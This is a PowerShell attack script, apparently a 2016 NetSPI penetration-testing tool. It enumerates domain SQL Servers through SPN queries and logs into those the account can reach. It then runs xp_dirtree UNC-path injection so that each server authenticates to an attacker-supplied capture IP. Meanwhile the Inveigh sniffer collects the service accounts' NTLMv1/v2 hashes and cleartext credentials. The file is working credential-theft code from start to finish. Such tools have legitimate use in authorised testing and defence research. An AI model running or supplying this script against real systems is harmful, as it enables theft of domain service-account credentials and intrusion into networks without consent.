# author: scott sutherland (@_nullbind), NetSPI 2016
# script name: Get-SQLServiceAccountPwHash.ps1
# requirements: import-module powerupsql.psm1 (https://github.com/nullbind/Powershellery/blob/master/Stable-ish/MSSQL/PowerUpSQL.psm1);import-module invoke-inveigh.ps1;import-module Inveigh-Relay.ps1 (https://github.com/Kevin-Robertson/Inveigh)
# Note: use for alt domain user: runas /noprofile /netonly /user:domain\users powershell.exe
# Example run as domain user: .\Get-SQLServiceAccountPwHash.ps1 -captureip 10.20.2.1 -verbose -timeout 10
#import-module .\powerupsql.psm1
#import-module .\inveigh.ps1
#we could auto escalate if there way a powershell smb to smb relay - inveigh mod?

[CmdletBinding()]
Param(
  [Parameter(Mandatory=$false)]
   [string]$username,
	
   [Parameter(Mandatory=$false)]
   [string]$password,

   [Parameter(Mandatory=$false)]
   [string]$domaincontroller,

   [Parameter(Mandatory=$true)]
   [string]$captureip,

   [Parameter(Mandatory=$false)]
   [int]$timeout = 5
)
 
# Discover SQL Servers on the Domain via LDAP queries for SPN records
Write-output "Testings access to domain sql servers..."
$SQLServerInstances = Get-SQLInstanceDomain -verbose -CheckMgmt -DomainController $domaincontroller -Username $username -Password $password | Get-SQLConnectionTestThreaded -Verbose -Threads 15 
$SQLServerInstancesCount = $SQLServerInstances.count
Write-output "$SQLServerInstancesCount SQL Server instances found"

# Get list of SQL Servers that the provided account can log into
$AccessibleSQLServers = $SQLServerInstances | ? {$_.status -eq "Accessible"}
$AccessibleSQLServersCount = $AccessibleSQLServers.count

# Perform unc path injection on each one
Write-output "$AccessibleSQLServersCount SQL Server instances can be logged into"
Write-output "Attacking $AccessibleSQLServersCount accessible SQL Server instances..."

# Start the sniffing
Invoke-Inveigh -NBNS Y -MachineAccounts Y -WarningAction SilentlyContinue | Out-Null 

$AccessibleSQLServers | 
ForEach-Object{
    
    # Get current instance ip
    $CurrentInstanceComputer = $_.ComputerName
    $CurrentInstanceIP = Resolve-DnsName $CurrentInstanceComputer| select IPaddress -ExpandProperty ipaddress
    $CurrentInstance = $_.Instance        

    # Start unc path injection for each interface
    Write-Output "$CurrentInstance ($CurrentInstanceIP) - Injecting UNC path"

    <# use local ips 
    Get-NetIPAddress | Select-Object ipaddress | 
    %{ 
        $IP = $_.IPAddress
        $IP
        Get-SQLQuery -Instance $CurrentInstance -Query "xp_dirtree '\\$IP\path'" -Verbose
    } #>

    Get-SQLQuery -Instance $CurrentInstance -Query "xp_dirtree '\\$captureip\path'" -Verbose
     
    # Sleep to give the SQL Server time to connect to us
    sleep $timeout
 
    # Get hashes
    Write-Output "Checking for captured password hashes"
    Get-InveighCleartext 
    Get-InveighNTLMv1
    Get-InveighNTLMv2
}

# Stop sniffing
# Write-Output "Stopping sniffer"
Stop-Inveigh | Out-Null 

# Clear memory
# Write-Output "Cleaning up"
Clear-Inveigh | Out-Null 
